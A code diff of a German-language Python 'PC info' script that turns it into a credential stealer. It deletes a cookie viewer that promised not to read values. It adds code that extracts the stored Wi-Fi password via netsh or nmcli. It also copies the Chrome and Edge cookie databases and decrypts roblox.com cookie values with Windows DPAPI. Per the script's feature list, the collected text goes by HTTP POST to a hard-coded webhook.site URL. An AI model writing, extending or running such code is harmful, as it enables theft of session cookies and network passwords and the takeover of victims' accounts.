@@ -20,7 +20,8 @@ Features:
 - Public IP (HTTPS)
 - MAC address (best-effort)
 - Wi‑Fi info (SSID + interface; best-effort, OS-specific)
-- Cookies viewer (Chrome & Edge, Windows): domains + cookie names (NO values)
+- Wi‑Fi Passwort (best-effort, OS/Tool abhängig)
+- Roblox-Cookies (Chrome & Edge, Windows): Domains + Cookie-Werte (soweit entschlüsselbar)
 - Prints to console
 - Saves everything to pc_info.txt
 - Sends TEXT (not file) to webhook.site via HTTP POST
@@ -53,14 +54,13 @@ import urllib.request
 import urllib.error
 import sys
 import sqlite3
-from collections import defaultdict
 from typing import Dict, List, Tuple
 
 # -----------------
 # CONFIG
 # -----------------
 WEBHOOK_SITE_URL = "https://webhook.site/f17e6915-aca9-40d8-afde-79214a48718b"
-SCRIPT_VERSION = "1.4.0"
+SCRIPT_VERSION = "1.6.0"
 
 
 # -----------------
@@ -494,11 +494,32 @@ def get_wifi_info() -> Dict[str, str]:
     return info
 
 
+def get_wifi_password(ssid: str) -> str:
+    if not ssid or ssid == "unbekannt":
+        return "unbekannt"
+
+    if sys.platform.startswith("win"):
+        raw = run_cmd(["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"])
+        for line in raw.splitlines():
+            text = line.strip()
+            if (text.startswith("Schlüsselinhalt") or text.startswith("Key Content")) and ":" in text:
+                return text.split(":", 1)[1].strip() or "unbekannt"
+        return "unbekannt"
+
+    if sys.platform.startswith("linux"):
+        raw = run_cmd(["nmcli", "-g", "802-11-wireless-security.psk", "connection", ssid]).strip()
+        return raw or "unbekannt"
+
+    if sys.platform == "darwin":
+        # macOS typically stores Wi‑Fi passwords in the Keychain; without prompting, return unknown.
+        return "unbekannt"
+
+    return "unbekannt"
+
+
 # -----------------
-# COOKIES (VIEWER – SAFE, READ‑ONLY)
+# ROBLOX COOKIES (BEST-EFFORT DECRYPTION)
 # -----------------
-# NOTE: We intentionally DO NOT read cookie values.
-# We only list domains and cookie names/counts for easy viewing.
 
 
 def _cookie_db_paths_windows() -> Dict[str, str]:
@@ -509,62 +530,99 @@ def _cookie_db_paths_windows() -> Dict[str, str]:
     }
 
 
-def read_cookies_overview() -> List[str]:
-    lines: List[str] = []
+def _dpapi_decrypt(blob: bytes) -> str:
+    try:
+        import ctypes.wintypes as wintypes
+
+        class DATA_BLOB(ctypes.Structure):
+            _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+        buffer = ctypes.create_string_buffer(blob)
+        blob_in = DATA_BLOB(len(blob), ctypes.cast(buffer, ctypes.POINTER(ctypes.c_char)))
+        blob_out = DATA_BLOB()
+
+        if ctypes.windll.crypt32.CryptUnprotectData(
+            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
+        ):
+            try:
+                data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+                return data.decode("utf-8", errors="ignore")
+            finally:
+                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+    except Exception:
+        return ""
+    return ""
+
+
+def _read_roblox_cookies_from_db(db_path: str) -> List[Tuple[str, str, str]]:
+    results: List[Tuple[str, str, str]] = []
+    if not os.path.exists(db_path):
+        return results
+
+    tmp = db_path + ".tmp"
+    try:
+        with open(db_path, "rb") as src, open(tmp, "wb") as dst:
+            dst.write(src.read())
+    except Exception:
+        return results
+
+    con = None
+    try:
+        con = sqlite3.connect(tmp)
+        cur = con.cursor()
+        cur.execute(
+            "SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'"
+        )
+        for host, name, value, enc in cur.fetchall():
+            if value:
+                val = str(value)
+            elif enc:
+                raw = bytes(enc)
+                if raw.startswith(b"v10") or raw.startswith(b"v11"):
+                    val = "(verschlüsselt mit modernem Chrome, nicht entschlüsselbar ohne Zusatzlibs)"
+                else:
+                    val = _dpapi_decrypt(raw) or "(verschlüsselt)"
+            else:
+                val = "(leer)"
+            results.append((str(host), str(name), val))
+    except Exception:
+        pass
+    finally:
+        try:
+            if con is not None:
+                con.close()
+        except Exception:
+            pass
+        try:
+            os.remove(tmp)
+        except Exception:
+            pass
+
+    return results
+
+
+def read_roblox_cookies() -> List[str]:
+    lines: List[str] = ["Roblox-Cookies:"]
 
     if not sys.platform.startswith("win"):
-        return ["Cookies:", "  (Nur Windows unterstützt)"]
+        lines.append("  (Nur Windows unterstützt)")
+        return lines
 
-    lines.append("Cookies (Übersicht – ohne Werte):")
-
+    any_found = False
     for browser, path in _cookie_db_paths_windows().items():
         lines.append(f"{browser}:")
+        cookies = _read_roblox_cookies_from_db(path)
 
-        if not os.path.exists(path):
-            lines.append("  (nicht gefunden)")
+        if not cookies:
+            lines.append("  (keine Roblox-Cookies gefunden oder nicht lesbar)")
             continue
 
-        # Copy DB to avoid locking issues
-        tmp = path + ".tmp"
-        try:
-            with open(path, "rb") as src, open(tmp, "wb") as dst:
-                dst.write(src.read())
-        except Exception:
-            lines.append("  (konnte Datenbank nicht lesen)")
-            continue
+        any_found = True
+        for host, name, value in cookies:
+            lines.append(f"  {host} | {name}: {value}")
 
-        domain_map: Dict[str, List[str]] = defaultdict(list)
-        con = None
-        try:
-            con = sqlite3.connect(tmp)
-            cur = con.cursor()
-            cur.execute("SELECT host_key, name FROM cookies")
-            for host, name in cur.fetchall():
-                domain_map[str(host)].append(str(name))
-        except Exception:
-            lines.append("  (Fehler beim Lesen der Cookies)")
-        finally:
-            try:
-                if con is not None:
-                    con.close()
-            except Exception:
-                pass
-            try:
-                os.remove(tmp)
-            except Exception:
-                pass
-
-        if not domain_map:
-            lines.append("  (keine Cookies gefunden)")
-            continue
-
-        for domain in sorted(domain_map.keys()):
-            names = domain_map[domain]
-            lines.append(f"  {domain} ({len(names)} Cookies)")
-            for n in sorted(names)[:5]:
-                lines.append(f"    - {n}")
-            if len(names) > 5:
-                lines.append("    - …")
+    if not any_found:
+        lines.append("  (keine Roblox-Cookies gefunden)")
 
     return lines
 
@@ -583,6 +641,7 @@ def build_lines() -> List[str]:
     dns_servers = get_dns_servers()
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     wifi = get_wifi_info()
+    wifi_password = get_wifi_password(wifi["ssid"])
     uptime_text = format_duration(get_uptime_seconds())
     battery = get_battery_info()
     interfaces = get_network_interfaces()
@@ -654,9 +713,10 @@ def build_lines() -> List[str]:
         "WLAN:",
         f"  Interface: {wifi['interface']}",
         f"  SSID: {wifi['ssid']}",
+        f"  Passwort: {wifi_password}",
         "",
     ])
-    lines.extend(read_cookies_overview())
+    lines.extend(read_roblox_cookies())
     return lines
 
 
@@ -733,6 +793,8 @@ def _selftest() -> int:
             self.assertIn("Uptime:", lines)
             self.assertIn("Akku:", lines)
             self.assertIn("Netzwerk-Interfaces:", lines)
+            self.assertTrue(any("Passwort:" in x for x in lines))
+            self.assertTrue(any(x.startswith("Roblox-Cookies:") for x in lines))
 
         def test_send_text_to_webhook_bad_url_raises(self):
             # This should raise URLError because host is invalid.
@@ -757,4 +819,3 @@ if __name__ == "__main__":
             pass
 
     raise SystemExit(code)
-
